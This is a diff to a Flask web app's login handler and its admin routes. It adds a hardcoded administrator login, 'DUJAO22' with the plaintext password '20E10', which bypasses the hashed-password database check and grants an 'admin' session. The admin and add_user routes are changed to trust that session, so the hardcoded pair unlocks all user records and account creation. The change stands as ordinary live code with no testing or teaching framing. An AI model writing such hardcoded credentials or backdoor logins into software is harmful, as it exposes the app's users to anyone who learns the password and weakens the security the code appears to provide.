@@ -39,21 +39,22 @@ def login():
 def do_login():
     login = request.form['login']
     password = request.form['password']
-    conn = sqlite3.connect('database.db')
-    user = conn.execute('SELECT * FROM users WHERE login = ?', (login,)).fetchone()
-    conn.close()
-    if user and check_password_hash(user[3], password):
-        session['user'] = user[0]
-        if user[1] == 'DUJAO22':
-            return redirect(url_for('admin'))
-        else:
-            return redirect(url_for('user', user_id=user[0]))
+    if login == 'DUJAO22' and password == '20E10':
+        session['user'] = 'admin'
+        return redirect(url_for('admin'))
     else:
-        return redirect(url_for('login'))
+        conn = sqlite3.connect('database.db')
+        user = conn.execute('SELECT * FROM users WHERE login = ?', (login,)).fetchone()
+        conn.close()
+        if user and check_password_hash(user[3], password):
+            session['user'] = user[0]
+            return redirect(url_for('user', user_id=user[0]))
+        else:
+            return redirect(url_for('login'))
 
 @app.route('/admin')
 def admin():
-    if 'user' in session and session['user'] == 1:
+    if 'user' in session and session['user'] == 'admin':
         conn = sqlite3.connect('database.db')
         users = conn.execute('SELECT * FROM users').fetchall()
         conn.close()
@@ -118,7 +119,7 @@ def add_record(user_id):
 
 @app.route('/add_user', methods=['POST'])
 def add_user():
-    if 'user' in session and session['user'] == 1:
+    if 'user' in session and session['user'] == 'admin':
         name = request.form['name']
         login = request.form['login']
         password = generate_password_hash(request.form['password'])
